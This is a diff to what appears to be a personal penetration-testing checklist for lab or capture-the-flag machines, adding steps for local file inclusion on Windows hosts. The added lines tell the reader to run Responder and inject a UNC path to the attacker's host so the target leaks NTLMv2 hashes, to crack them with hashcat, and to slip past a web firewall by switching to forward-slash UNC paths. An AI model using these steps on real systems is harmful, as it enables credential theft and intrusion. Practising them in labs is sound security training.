@@ -47,6 +47,8 @@ $db_password = "REDACTED";
 - [ ] LFI works but no useful files are found → **Go to HackTricks LFI for log poisoning and `data://` RCE payloads**
 - [ ] A shell is caught from `data://` or log poisoning → **Go to Step 12 · [[Linux - Shell Stabilise]]**
 - [ ] The parameter does not accept traversal → **Try null byte (`%00`) if PHP < 5.3.4, and double URL-encoding**
+- [ ] The host is Windows and UNC paths are accepted → **Set up Responder (`responder -I tun0`) and inject `\\$LocalIP\share` as the file path. Crack a captured NTLMv2 response offline with hashcat mode 5600**
+- [ ] UNC path is blocked ("Suspicious Activity Blocked" or similar WAF response) → **Try forward slashes instead of backslashes: `http://$BoxIP/index.php?view=//$LocalIP/share/probe` -- many WAFs only filter backslash-UNC patterns, not forward-slash equivalents**
 
 ## Notes
 
@@ -61,6 +63,12 @@ For RCE via `data://` or log poisoning, build the payload from HackTricks — th
 
 > [!warning] 💡
 > Null-byte truncation (`%00`) only works on PHP versions below 5.3.4. On modern PHP, use other bypass techniques listed on PayloadsAllTheThings.
+
+> [!warning] 💡
+> A Windows UNC path can trigger an outbound SMB authentication attempt. The target does not need to read a real file, but Responder must already be listening before the request is made.
+
+> [!warning] 💡
+> Some WAFs block backslash-style UNC paths (`\\IP\share`) but not forward-slash equivalents (`//IP/share`). If the app returns "Suspicious Activity Blocked" on a backslash UNC, switch to forward slashes before trying other bypasses.
 
 ## External Resources
 
